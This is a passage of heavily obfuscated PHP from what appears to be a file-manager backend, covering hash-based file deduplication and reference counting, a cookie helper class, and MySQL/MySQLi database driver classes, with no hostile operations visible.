$úĞåÖÛŠÇ±[33]); if (!$¼ø‹¤Ê´¥Ú) { show_json($úĞåÖÛŠÇ±[1798], !1); } } CacheLock::unlock($Ëµê€²); break; case $úĞåÖÛŠÇ±[1793]: break; default: break; } return $î˜±í; } public function addFileByRemote($£Ç§, $˜úù‰Ä, $ª¾Çˆ = array()) { $¦É±ÉÍ•‚Ñ— =& $_SERVER[ÀÆ]; if (!IO::exist($£Ç§)) { return !1; } $¶ş¾ÔşµÇ = $ª¾Çˆ[$¦É±ÉÍ•‚Ñ—[170]] ? $ª¾Çˆ[$¦É±ÉÍ•‚Ñ—[170]] : $¦É±ÉÍ•‚Ñ—[33]; $¹Ù = IO::hashMd5($£Ç§, $¶ş¾ÔşµÇ); $òãÚ¤Ãğñ = KodIO::defaultDriver(); $— = array($¦É±ÉÍ•‚Ñ—[573] => IO::size($£Ç§), $¦É±ÉÍ•‚Ñ—[1799] => 1, $¦É±ÉÍ•‚Ñ—[415] => $˜úù‰Ä, $¦É±ÉÍ•‚Ñ—[800] => $òãÚ¤Ãğñ[$¦É±ÉÍ•‚Ñ—[395]], $¦É±ÉÍ•‚Ñ—[416] => $£Ç§, $¦É±ÉÍ•‚Ñ—[1800] => $ª¾Çˆ[$¦É±ÉÍ•‚Ñ—[171]] ? $ª¾Çˆ[$¦É±ÉÍ•‚Ñ—[171]] : IO::hashSimple($£Ç§), $¦É±ÉÍ•‚Ñ—[1801] => $¹Ù ? $¹Ù : $¶ş¾ÔşµÇ); if ($ÛöŒ±ôĞå = $this->addFileCheckExist($—[$¦É±ÉÍ•‚Ñ—[171]], $—[$¦É±ÉÍ•‚Ñ—[170]], $—[$¦É±ÉÍ•‚Ñ—[78]])) { return $ÛöŒ±ôĞå; } return $this->addFileData($—); } private function addFileData($œ¿‹’Ñ) { $¢ˆ =& $_SERVER[ÀÆ]; if (!$œ¿‹’Ñ) { return !1; } $œ¿‹’Ñ[$¢ˆ[78]] = intval($œ¿‹’Ñ[$¢ˆ[78]]); if (!$œ¿‹’Ñ[$¢ˆ[78]] && strlen($œ¿‹’Ñ[$¢ˆ[171]]) > 32) { $œ¿‹’Ñ[$¢ˆ[78]] = intval(substr($œ¿‹’Ñ[$¢ˆ[171]], 32)); } $¨Ô›« = $this->add($œ¿‹’Ñ); return $this->find($¨Ô›«); } public function addFile($ÙÙó°øÚ¹, $©ğ¬å¥–¼·, $°ŸÄª£‰ = false) { $ïà‰ó =& $_SERVER[ÀÆ]; $—¶Â€ = IO::hashSimple($ÙÙó°øÚ¹); $‹ = IO::size($ÙÙó°øÚ¹); $£‹§È = $‹ <= 1024 * 1024 * 10 ? IO::hashMd5($ÙÙó°øÚ¹) : $ïà‰ó[33]; $­ÉıÍö = $ïà‰ó[1802] . $—¶Â€; CacheLock::lock($­ÉıÍö); if ($£‹§È && $—¶Â€) { $à™ÏùÕÏÌæ = $this->addFileCheckExist($—¶Â€, $£‹§È, $‹); if ($à™ÏùÕÏÌæ) { CacheLock::unlock($­ÉıÍö); return $à™ÏùÕÏÌæ; } } $ı¼ÏÜ‰ = $this->addFileMake($ÙÙó°øÚ¹, $‹, $—¶Â€, $£‹§È, $©ğ¬å¥–¼·, $°ŸÄª£‰); $ÃŒŞíÈ‰ = $this->addFileData($ı¼ÏÜ‰); CacheLock::unlock($­ÉıÍö); if (!$£‹§È && $ÃŒŞíÈ‰) { $this->fileMd5Check($ÃŒŞíÈ‰); } return $ÃŒŞíÈ‰; } private function fileMd5Check($çôú«²ä) { $ø˜²şĞÏÀ›öó =& $_SERVER[ÀÆ]; $ù¶â = array($çôú«²ä[$ø˜²şĞÏÀ›öó[461]], $çôú«²ä[$ø˜²şĞÏÀ›öó[76]]); $ïúŠ = $ø˜²şĞÏÀ›öó[1803] . $çôú«²ä[$ø˜²şĞÏÀ›öó[76]]; $üÉ = $ø˜²şĞÏÀ›öó[1804] . $çôú«²ä[$ø˜²şĞÏÀ›öó[461]]; $¶®ä®æˆ¯óêà = TaskQueue::add($ø˜²şĞÏÀ›öó[1805], $ù¶â, $ïúŠ, $üÉ); if (!$¶®ä®æˆ¯óêà) { $this->fileMd5Set($çôú«²ä[$ø˜²şĞÏÀ›öó[461]], $çôú«²ä[$ø˜²şĞÏÀ›öó[76]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($àœ, $…ş) { $Ç ·ø™Ñı¸Ù =& $_SERVER[ÀÆ]; $¿“Œ±¢ = $this->find($àœ); if (!$¿“Œ±¢ || $¿“Œ±¢[$Ç ·ø™Ñı¸Ù[170]]) { return; } $¶¥ = IO::hashMd5($…ş); if (!$¶¥) { return $Ç ·ø™Ñı¸Ù[33]; } $this->where(array($Ç ·ø™Ñı¸Ù[461] => $àœ))->save(array($Ç ·ø™Ñı¸Ù[170] => $¶¥)); } public function addFileMake($çÖ·—şùíŞ, $±’È, $ÅÉÛ¡øÔ›‰æ, $Î¸, $”Æ, $®ğ¤æ£­) { $ß¼ÇğÔ =& $_SERVER[ÀÆ]; $İÙÚÖ… = $this->createFileName($”Æ, $ÅÉÛ¡øÔ›‰æ, $Î¸); $¹ ó·Ì³—°ğÔ = get_path_father($İÙÚÖ…); $àÉ = get_path_this($İÙÚÖ…); if ($®ğ¤æ£­) { $—– = IO::move($çÖ·—şùíŞ, $¹ ó·Ì³—°ğÔ, !1, $àÉ); } else { $—– = IO::copy($çÖ·—şùíŞ, $¹ ó·Ì³—°ğÔ, !1, $àÉ); } if (!$—–) { return !1; } $Ğ¢âÌ = KodIO::defaultDriver(); $Ğ¡êõœË¬´ = array($ß¼ÇğÔ[573] => $±’È, $ß¼ÇğÔ[1799] => 1, $ß¼ÇğÔ[415] => $”Æ, $ß¼ÇğÔ[800] => $Ğ¢âÌ[$ß¼ÇğÔ[395]], $ß¼ÇğÔ[416] => $İÙÚÖ…, $ß¼ÇğÔ[1800] => $ÅÉÛ¡øÔ›‰æ, $ß¼ÇğÔ[1801] => $Î¸); return $Ğ¡êõœË¬´; } public function addFileCheckExist($æ•ûèñŒÍ°Ãœ, $¬¢¥ê”‹•ı®, $× Ÿ) { $ƒñˆğÊõ =& $_SERVER[ÀÆ]; $ÌÃ¨Ü‘ö = $this->findByHash($æ•ûèñŒÍ°Ãœ, $¬¢¥ê”‹•ı®); if (!$ÌÃ¨Ü‘ö) { return !1; } $²ëœÓ¤”ï§î = array($ƒñˆğÊõ[1799] => intval($ÌÃ¨Ü‘ö[$ƒñˆğÊõ[1806]]) + 1, $ƒñˆğÊõ[573] => $× Ÿ); $this->where(array($ƒñˆğÊõ[462] => $ÌÃ¨Ü‘ö[$ƒñˆğÊõ[461]]))->save($²ëœÓ¤”ï§î); return $ÌÃ¨Ü‘ö; } public function remove($¯„…›’åŒõ) { $this->linkCountChange($¯„…›’åŒõ, !1); $this->clearEmpty(); return !0; } public function linkAdd($ö®€) { $this->linkCountChange($ö®€, !0); } public function linkCountChange($ÑŸ˜, $§ı) { $¦ö­öÑñ =& $_SERVER[ÀÆ]; if (!$ÑŸ˜) { return; } if (!is_array($ÑŸ˜)) { $ÑŸ˜ = array($ÑŸ˜); } $ŒÉŒ†¯»š = array(); foreach ($ÑŸ˜ as $—Ş¦£Ì§¼ëõ) { $òæ” = $—Ş¦£Ì§¼ëõ . $¦ö­öÑñ[33]; if (!$ŒÉŒ†¯»š[$òæ”]) { $ŒÉŒ†¯»š[$òæ”] = 0; } $ŒÉŒ†¯»š[$òæ”]++; } $À§ÇúÑ¾¸ïŞ÷ = array(); foreach ($ŒÉŒ†¯»š as $—Ş¦£Ì§¼ëõ => $¥ŞöŠ¶îèŸˆĞ) { $òæ” = $¥ŞöŠ¶îèŸˆĞ . $¦ö­öÑñ[33]; if (!$À§ÇúÑ¾¸ïŞ÷[$òæ”]) { $À§ÇúÑ¾¸ïŞ÷[$òæ”] = array(); } $À§ÇúÑ¾¸ïŞ÷[$òæ”][] = $—Ş¦£Ì§¼ëõ; } foreach ($À§ÇúÑ¾¸ïŞ÷ as $¥ŞöŠ¶îèŸˆĞ => $ÁÂî±äÕù) { if (!$ÁÂî±äÕù) { continue; } $¥ŞöŠ¶îèŸˆĞ = $§ı ? $¥ŞöŠ¶îèŸˆĞ : -intval($¥ŞöŠ¶îèŸˆĞ); $›ÎŒ¯˜ = array($¦ö­öÑñ[461] => array($¦ö­öÑñ[7], $ÁÂî±äÕù)); if ($¥ŞöŠ¶îèŸˆĞ < 0) { $›ÎŒ¯˜[$¦ö­öÑñ[1806]] = array($¦ö­öÑñ[1006], abs($¥ŞöŠ¶îèŸˆĞ)); } $this->where($›ÎŒ¯˜)->setAdd($¦ö­öÑñ[1806], $¥ŞöŠ¶îèŸˆĞ); } } public function findByHash($ßÂñ¼, $…¶…Îä¦›¦şÍ = false) { $“üš¢ =& $_SERVER[ÀÆ]; if (!$ßÂñ¼ && !$…¶…Îä¦›¦şÍ) { return !1; } $şßşó = array($“üš¢[1800] => $ßÂñ¼); if ($…¶…Îä¦›¦şÍ) { $şßşó = array($“üš¢[1801] => $…¶…Îä¦›¦şÍ); } return $this->order($“üš¢[1807])->where($şßşó)->find(); } public function clearEmpty($İÉ¦¶«º¯±Â = 0) { $ş‘ƒ‹ã‘¢ÂÉ =& $_SERVER[ÀÆ]; $ó±Áï¶Ü = time() - 3600 * 24 * $İÉ¦¶«º¯±Â; $è´ŠçŒ = $ş‘ƒ‹ã‘¢ÂÉ[1808] . $ó±Áï¶Ü; $°ñ¹¬® = $this->where($è´ŠçŒ)->select(); if (!$°ñ¹¬®) { return; } $¿§Ó¾ = new Task($ş‘ƒ‹ã‘¢ÂÉ[1809], $ş‘ƒ‹ã‘¢ÂÉ[33], count($°ñ¹¬®)); foreach ($°ñ¹¬® as $ø¼®’Õ×ŞÍ) { $¿§Ó¾->update(1); $this->resetFile($ø¼®’Õ×ŞÍ); } $¿§Ó¾->end(); } public function resetFile($¤¯½¾) { $¢À“ˆ =& $_SERVER[ÀÆ]; $Ë°‰¸û®§Üª½ = array($¢À“ˆ[462] => $¤¯½¾[$¢À“ˆ[461]]); $ò¤–¥ÙØşöÁ = Model($¢À“ˆ[1250])->where($Ë°‰¸û®§Üª½)->count(); $ºŠÙßÑÃ± = Model($¢À“ˆ[1810])->where($Ë°‰¸û®§Üª½)->count(); $ğ¬Ã°àğ¤‹ = intval($ò¤–¥ÙØşöÁ) + intval($ºŠÙßÑÃ±); if ($ğ¬Ã°àğ¤‹ == 0) { IO::remove($¤¯½¾[$¢À“ˆ[76]]); Model($¢À“ˆ[1811])->delete($¤¯½¾[$¢À“ˆ[461]]); $this->where($Ë°‰¸û®§Üª½)->delete(); $this->metaSet($¤¯½¾[$¢À“ˆ[461]], null, null); return; } if ($¤¯½¾[$¢À“ˆ[1806]] != $ğ¬Ã°àğ¤‹) { $this->where($Ë°‰¸û®§Üª½)->save(array($¢À“ˆ[1799] => $ğ¬Ã°àğ¤‹)); } } public function storageInfo($Ø€›„ = false) { $·úîİŸı =& $_SERVER[ÀÆ]; $´ø°ğï·»› = $this->count() + 0.0; $Ÿ˜Ğ = 0; $Ğ¯ = 1; $ØµÜ¯çÀÁ– = 0; $¹ÕáÙ§¬¿Îø” = 5000; for ($½Æùß = 0; $½Æùß < $´ø°ğï·»›; $½Æùß = $½Æùß + $¹ÕáÙ§¬¿Îø”) { $®ÎØ = $this->limit($½Æùß, $½Æùß + $¹ÕáÙ§¬¿Îø”)->select(); foreach ($®ÎØ as $©ùıà×§Ú) { $Ğ¯ += $©ùıà×§Ú[$·úîİŸı[78]] * $©ùıà×§Ú[$·úîİŸı[1806]]; $Ÿ˜Ğ += $©ùıà×§Ú[$·úîİŸı[78]] * ($©ùıà×§Ú[$·úîİŸı[1806]] - 1); $ØµÜ¯çÀÁ– += $©ùıà×§Ú[$·úîİŸı[1806]]; } } $­ø¹ÒĞ = array($·úîİŸı[1812] => $Ğ¯, $·úîİŸı[1813] => $Ÿ˜Ğ, $·úîİŸı[1814] => $Ÿ˜Ğ / $Ğ¯, $·úîİŸı[82] => $´ø°ğï·»›, $·úîİŸı[1815] => $ØµÜ¯çÀÁ–); return $­ø¹ÒĞ; } } goto BµíŠ”»; F·‘é†ø¢—: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($³İ¤Ê¤ = '', $ı˜‡ÀÉØï¯ä = 0) { if (is_string($³İ¤Ê¤) && $³İ¤Ê¤ != $_SERVER[ÀÆ][33]) { $this->prefix = $³İ¤Ê¤; } if (is_numeric($ı˜‡ÀÉØï¯ä) && $ı˜‡ÀÉØï¯ä > 0) { $this->expire = $ı˜‡ÀÉØï¯ä; } } public static function getInstance() { static $ŠÜ¡¾µµë±; if ($ŠÜ¡¾µµë± === null) { $ŠÜ¡¾µµë± = new self(); } return $ŠÜ¡¾µµë±; } private static $cookieDisable = false; public static function disable($Ü•£‰€ÆŒË) { self::$cookieDisable = $Ü•£‰€ÆŒË; } private static $sameCookieSet = array(); public static function set($Œª¼Çäï©—, $ß°³¾Õö, $Â€¹Éã˜ = 0, $ö¢¹ç = false, $İ˜Š = false) { $”õÎÒ©«ô =& $_SERVER[ÀÆ]; if (self::$cookieDisable) { return; } if (!$Â€¹Éã˜) { $Â€¹Éã˜ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$Œª¼Çäï©—]) && self::$sameCookieSet[$Œª¼Çäï©—] == $ß°³¾Õö . $Â€¹Éã˜) { return; } self::$sameCookieSet[$Œª¼Çäï©—] = $ß°³¾Õö . $Â€¹Éã˜; if (!$İ˜Š) { $İ˜Š = str_replace(HOST, $”õÎÒ©«ô[33], APP_HOST); $İ˜Š = _get($GLOBALS, $”õÎÒ©«ô[878], $İ˜Š); } $¼ú¹ = $”õÎÒ©«ô[33]; setcookie($Œª¼Çäï©—, $ß°³¾Õö, time() + $Â€¹Éã˜, $”õÎÒ©«ô[8] . trim($İ˜Š, $”õÎÒ©«ô[8]) . $¼ú¹, !1, !1, $ö¢¹ç); } public static function setSafe($ùİ¿´ş¹, $ƒ¨ƒ¥Ãè¡, $åÜÍÀˆ½Á = 0) { self::set($ùİ¿´ş¹, $ƒ¨ƒ¥Ãè¡, $åÜÍÀˆ½Á, !0); } public static function get($ Œ) { return isset($_COOKIE[$ Œ]) ? $_COOKIE[$ Œ] : !1; } public static function remove($¼¤™Öƒ®Ş¨ûÔ, $†‡ = false) { unset($_COOKIE[$¼¤™Öƒ®Ş¨ûÔ]); self::set($¼¤™Öƒ®Ş¨ûÔ, $_SERVER[ÀÆ][33], 1, $†‡); } } class DbMysql extends Db { public function __construct($¤ = '') { $­ÃÏÆ‡ÎÕü =& $_SERVER[ÀÆ]; if (!extension_loaded($­ÃÏÆ‡ÎÕü[786])) { think_exception(think_lang($­ÃÏÆ‡ÎÕü[10]) . $­ÃÏÆ‡ÎÕü[879]); } if (!empty($¤)) { $this->config = $¤; if (empty($this->config[$­ÃÏÆ‡ÎÕü[13]])) { $this->config[$­ÃÏÆ‡ÎÕü[13]] = $­ÃÏÆ‡ÎÕü[33]; } } } public function connect($š•ÚÂóã = '', $öè„ = 0, $›£î‚¾¦ = false) { $€ü´¡Î =& $_SERVER[ÀÆ]; if (!isset($this->linkID[$öè„])) { if (empty($š•ÚÂóã)) { $š•ÚÂóã = $this->config; } $”´ = $š•ÚÂóã[$€ü´¡Î[880]] . ($š•ÚÂóã[$€ü´¡Î[881]] ? "\72{$š•ÚÂóã[$€ü´¡Î[881]]}" : $€ü´¡Î[33]); $Ş÷Êè€¢ = !empty($š•ÚÂóã[$€ü´¡Î[13]][$€ü´¡Î[14]]) ? $š•ÚÂóã[$€ü´¡Î[13]][$€ü´¡Î[14]] : $this->pconnect; if ($Ş÷Êè€¢) { $this->linkID[$öè„] = mysql_pconnect($”´, $š•ÚÂóã[$€ü´¡Î[882]], $š•ÚÂóã[$€ü´¡Î[883]], 131072); } else { $this->linkID[$öè„] = mysql_connect($”´, $š•ÚÂóã[$€ü´¡Î[882]], $š•ÚÂóã[$€ü´¡Î[883]], !0, 131072); } if (!$this->linkID[$öè„] || !empty($š•ÚÂóã[$€ü´¡Î[17]]) && !mysql_select_db($š•ÚÂóã[$€ü´¡Î[17]], $this->linkID[$öè„])) { think_exception(mysql_error()); } $©¨“í = mysql_get_server_info($this->linkID[$öè„]); mysql_query($€ü´¡Î[884] . think_config($€ü´¡Î[885]) . $€ü´¡Î[55], $this->linkID[$öè„]); if ($©¨“í > $€ü´¡Î[886]) { mysql_query($€ü´¡Î[887], $this->linkID[$öè„]); } $this->connected = !0; if (1 != think_config($€ü´¡Î[18])) { unset($this->config); } } return $this->linkID[$öè„]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($éÎ˜‘) { $´õ„”á =& $_SERVER[ÀÆ]; if (0 === stripos($éÎ˜‘, $´õ„”á[262])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $éÎ˜‘; if ($this->queryID) { $this->free(); } think_action_status($´õ„”á[19], 1); think_status($´õ„”á[20]); $this->queryID = mysql_query($éÎ˜‘, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($Ì¶ôûÆÇá) { $ä»ÜÇ£ÊÛ =& $_SERVER[ÀÆ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ì¶ôûÆÇá; if ($this->queryID) { $this->free(); } think_action_status($ä»ÜÇ£ÊÛ[21], 1); think_status($ä»ÜÇ£ÊÛ[20]); $¨¾ĞÉä¥Ø = mysql_query($Ì¶ôûÆÇá, $this->_linkID); $this->debug(); if (!1 === $¨¾ĞÉä¥Ø) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ÀÆ][888], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $•¨íÈ = mysql_query($_SERVER[ÀÆ][889], $this->_linkID); $this->transTimes = 0; if (!$•¨íÈ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $«“Şßïï³ß = mysql_query($_SERVER[ÀÆ][890], $this->_linkID); $this->transTimes = 0; if (!$«“Şßïï³ß) { $this->error(); return !1; } } return !0; } private function getAll() { $Õ››ˆ = array(); if ($this->numRows > 0) { while ($åóÎìÁÑ¼­òÙ = mysql_fetch_assoc($this->queryID)) { $Õ››ˆ[] = $åóÎìÁÑ¼­òÙ; } mysql_data_seek($this->queryID, 0); } return $Õ››ˆ; } public function getFields($àüã) { $Œ´ =& $_SERVER[ÀÆ]; $‹®ÚÜûüÕßí = $this->query($Œ´[891] . $this->parseKey($àüã)); $¼×ÈØ¸åï = array(); if ($‹®ÚÜûüÕßí) { foreach ($‹®ÚÜûüÕßí as $Ôû ôÆ => $âÉŞÍ•‹…†Ò) { $¼×ÈØ¸åï[$âÉŞÍ•‹…†Ò[$Œ´[27]]] = array($Œ´[28] => $âÉŞÍ•‹…†Ò[$Œ´[27]], $Œ´[29] => $âÉŞÍ•‹…†Ò[$Œ´[30]], $Œ´[31] => (bool) (strtoupper($âÉŞÍ•‹…†Ò[$Œ´[32]]) === $Œ´[892]), $Œ´[34] => $âÉŞÍ•‹…†Ò[$Œ´[35]], $Œ´[36] => strtolower($âÉŞÍ•‹…†Ò[$Œ´[37]]) == $Œ´[38], $Œ´[39] => strtolower($âÉŞÍ•‹…†Ò[$Œ´[40]]) == $Œ´[41]); } } return $¼×ÈØ¸åï; } public function getTables($”Ìûœ¾®®‹Ş = '') { $¿£‰ªö¹œÄ‹ =& $_SERVER[ÀÆ]; if (!empty($”Ìûœ¾®®‹Ş)) { $Ëğ‡ = $¿£‰ªö¹œÄ‹[893] . $”Ìûœ¾®®‹Ş . $¿£‰ªö¹œÄ‹[894]; } else { $Ëğ‡ = $¿£‰ªö¹œÄ‹[895]; } $ÖÜ¡Î¸ğ¥› = $this->query($Ëğ‡); $Êó—šğª¶õÆ² = array(); foreach ($ÖÜ¡Î¸ğ¥› as $Äğ¥‰ñ´á => $šğ) { $Êó—šğª¶õÆ²[$Äğ¥‰ñ´á] = current($šğ); } return $Êó—šğª¶õÆ²; } public function replace($£Ï¬„ë , $ã×¤¿’ôÆ = array()) { $ÅõÍæºÙæ©® =& $_SERVER[ÀÆ]; foreach ($£Ï¬„ë  as $€ÏÃ–‰ => $’õ¹ùî‡üšÎ) { $ÈúéÇêäô = $this->parseValue($’õ¹ùî‡üšÎ); if (is_scalar($ÈúéÇêäô)) { $ˆß[] = $ÈúéÇêäô; $ÂİÍùĞ×ÃğË[] = $this->parseKey($€ÏÃ–‰); } } $Ú¸Ö = $ÅõÍæºÙæ©®[896] . $this->parseTable($ã×¤¿’ôÆ[$ÅõÍæºÙæ©®[277]]) . $ÅõÍæºÙæ©®[897] . implode($ÅõÍæºÙæ©®[47], $ÂİÍùĞ×ÃğË) . $ÅõÍæºÙæ©®[898] . implode($ÅõÍæºÙæ©®[47], $ˆß) . $ÅõÍæºÙæ©®[899]; return $this->execute($Ú¸Ö); } public function insertAll($‡æí, $°‘Üù = array(), $™ò = false) { $ßŠ­şá¶É”Ø =& $_SERVER[ÀÆ]; if (!is_array($‡æí[0])) { return !1; } $ß× = array_keys($‡æí[0]); $øÛ€¤ÒÂİôú’ = array(); foreach ($‡æí as $ˆó€î‡) { $Üöş› = array(); foreach ($ˆó€î‡ as $£ => $çÈ) { $çÈ = $this->parseValue($çÈ); if (is_scalar($çÈ)) { $Üöş›[] = $çÈ; } } $øÛ€¤ÒÂİôú’[] = $ßŠ­şá¶É”Ø[258] . implode($ßŠ­şá¶É”Ø[47], $Üöş›) . $ßŠ­şá¶É”Ø[899]; } array_walk($ß×, array($this, $ßŠ­şá¶É”Ø[900])); $’‘¯€îÏ = ($™ò ? $ßŠ­şá¶É”Ø[901] : $ßŠ­şá¶É”Ø[902]) . $ßŠ­şá¶É”Ø[903] . $this->parseTable($°‘Üù[$ßŠ­şá¶É”Ø[277]]) . $ßŠ­şá¶É”Ø[897] . implode($ßŠ­şá¶É”Ø[47], $ß×) . $ßŠ­şá¶É”Ø[904] . implode($ßŠ­şá¶É”Ø[47], $øÛ€¤ÒÂİôú’); return $this->execute($’‘¯€îÏ); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ûàúı³´âµë =& $_SERVER[ÀÆ]; $this->error = mysql_errno() . $Ûàúı³´âµë[4] . mysql_error($this->_linkID); if ($Ûàúı³´âµë[33] != $this->queryStr) { $this->error .= LNG($Ûàúı³´âµë[45]) . $this->queryStr; } think_trace($this->error, $Ûàúı³´âµë[33], $Ûàúı³´âµë[46]); return $this->error; } public function escapeString($„Í) { if ($this->_linkID) { return mysql_real_escape_string($„Í, $this->_linkID); } else { return mysql_escape_string($„Í); } } public function parseKey(&$ş–Â, $ğ — = true) { $Ï =& $_SERVER[ÀÆ]; if ($ğ —) { $ş–Â = $this->parseKeyCheck($ş–Â); } if ($ş–Â != $Ï[182] && !preg_match($Ï[905], $ş–Â)) { $ş–Â = $Ï[383] . trim($ş–Â, $Ï[383]) . $Ï[383]; } return $ş–Â; } } class DbMysqli extends Db { public function __construct($ĞõÁÉå˜¬´¦ = '') { $á‡À®Ğâ =& $_SERVER[ÀÆ]; if (!extension_loaded($á‡À®Ğâ[785])) { think_exception(think_lang($á‡À®Ğâ[10]) . $á‡À®Ğâ[906]); } if (!empty($ĞõÁÉå˜¬´¦)) { $this->config = $ĞõÁÉå˜¬´¦; if (empty($this->config[$á‡À®Ğâ[13]])) { $this->config[$á‡À®Ğâ[13]] = $á‡À®Ğâ[33]; } } } public function connect($ÕË¯À = '', $Â´ºëí¢¬ö¤ = 0) { $ƒªûØÜ =& $_SERVER[ÀÆ]; if (!isset($this->linkID[$Â´ºëí¢¬ö¤])) { if (empty($ÕË¯À)) { $ÕË¯À = $this->config; } $this->linkID[$Â´ºëí¢¬ö¤] = new mysqli($ÕË¯À[$ƒªûØÜ[880]], $ÕË¯À[$ƒªûØÜ[882]], $ÕË¯À[$ƒªûØÜ[883]], $ÕË¯À[$ƒªûØÜ[17]], $ÕË¯À[$ƒªûØÜ[881]] ? intval($ÕË¯À[$ƒªûØÜ[881]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $–…óÄë¼ = $this->linkID[$Â´ºëí¢¬ö¤]->server_version; $this->linkID[$Â´ºëí¢¬ö¤]->query($ƒªûØÜ[884] . think_config($ƒªûØÜ[885]) . $ƒªûØÜ[55]); if ($–…óÄë¼ > $ƒªûØÜ[886]) { $this->linkID[$Â´ºëí¢¬ö¤]->query($ƒªûØÜ[887]); } $this->connected = !0; if (1 != think_config($ƒªûØÜ[18])) { unset($this->config); } } return $this->linkID[$Â´ºëí¢¬ö¤]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($© Å‡ó§æÚî) { $÷„Û =& $_SERVER[ÀÆ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $© Å‡ó§æÚî; if ($this->queryID) { $this->free(); } think_action_status($÷„Û[19], 1); think_status($÷„Û[20]); $this->queryID = $this->_linkID->query($© Å‡ó§æÚî); if ($this->_linkID->more_results()) { while (($×—áÒÑûÛ» = $this->_linkID->next_result()) != NULL) { $×—áÒÑûÛ»->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($¬«·˜½–) { $×òñ—¥îá =& $_SERVER[ÀÆ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¬«·˜½–; if ($this->queryID) { $this->free(); } think_action_status($×òñ—¥îá[21], 1); think_status($×òñ—¥îá[20]); $‚òÔÁ = $this->_linkID->query($¬«·˜½–); $this->debug(); if (!1 === $‚òÔÁ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÄØİı‚¨ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ÄØİı‚¨) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ôâ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ôâ) { $this->error(); return !1; } } return !0; } private function getAll() { $ÚØÄ– ©ş = array(); if ($this->numRows > 0) { for ($õĞÆ¾ = 0; $õĞÆ¾ < $this->numRows; $õĞÆ¾++) { $ÚØÄ– ©ş[$õĞÆ¾] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ÚØÄ– ©ş; } public function getFields($¹³µñåÒ”Ù²) { $Á÷ =& $_SERVER[ÀÆ]; $°”ç†¨ğÉĞ¿ø = $this->query($Á÷[891] . $this->parseKey($¹³µñåÒ”Ù²)); $®Âù¿éÀç = array(); if ($°”ç†¨ğÉĞ¿ø) { foreach ($°”ç†¨ğÉĞ¿ø as $ø³Ù => $éüÕ) { $®Âù¿éÀç[$éüÕ[$Á÷[27]]] = array($Á÷[28] => $éüÕ[$Á÷[27]], $Á÷[29] => $éüÕ[$Á÷[30]], $Á÷[31] => (bool) ($éüÕ[$Á÷[32]] === $Á÷[33]), $Á÷[34] => $éüÕ[$Á÷[35]], $Á÷[36] => strtolower($éüÕ[$Á÷[37]]) == $Á÷[38], $Á÷[39] => strtolower($éüÕ[$Á÷[40]]) == $Á÷[41]); } } return $®Âù¿éÀç; } public function getTables($½‹¤ = '') { $ã× =& $_SERVER[ÀÆ]; $¾Ò‘ = !empty($½‹¤) ? $ã×[893] . $½‹¤ . $ã×[894] : $ã×[895]; $æä = $this->query($¾Ò‘); $øŒ³óø = array(); if ($æä) { foreach ($æä as $‡¦µ– => $Ü…ÁÈ‚Èï¾) { $øŒ³óø[$‡¦µ–] = current($Ü…ÁÈ‚Èï¾); } } return $øŒ³óø; } public function replace($²µØ°å…® ì, $®€âÜ‹ã = array()) { $—„Ê =& $_SERVER[ÀÆ]; foreach ($²µØ°å…® ì as $² => $†‡ç) { $äõŞ = $this->parseValue($†‡ç); if (is_scalar($äõŞ)) { $şÇ³’Ç[] = $äõŞ; $Íğ‘øßØ˜¢‰[] = $this->parseKey($²); } } $âı§¾‰äìÌ = $—„Ê[896] . $this->parseTable($®€âÜ‹ã[$—„Ê[277]]) . $—„Ê[897] . implode($—„Ê[47], $Íğ‘øßØ˜¢‰) . $—„Ê[898] . implode($—„Ê[47], $şÇ³’Ç) . $—„Ê[899]; return $this->execute($âı§¾‰äìÌ); } public function insertAll($‚ÓÅü£…ÆÏ, $Ùˆ¼Å»ØŒğ = array(), $É±½ÃÆ = false) { $ÓÁâØ„Ñ =& $_SERVER[ÀÆ]; if (!is_array($‚ÓÅü£…ÆÏ[0])) { return !1; } $ş• = array_keys($‚ÓÅü£…ÆÏ[0]); $¿éıº¿Ÿ = array(); foreach ($‚ÓÅü£…ÆÏ as $‡°Íå°–) { $´ÉØ = array(); foreach ($‡°Íå°– as $õöğ¦ => $Î‡§ÔÈ‹) { $Î‡§ÔÈ‹ = $this->parseValue($Î‡§ÔÈ‹); if (is_scalar($Î‡§ÔÈ‹)) { $´ÉØ[] = $Î‡§ÔÈ‹; } } $¿éıº¿Ÿ[] = $ÓÁâØ„Ñ[258] . implode($ÓÁâØ„Ñ[47], $´ÉØ) . $ÓÁâØ„Ñ[899]; } 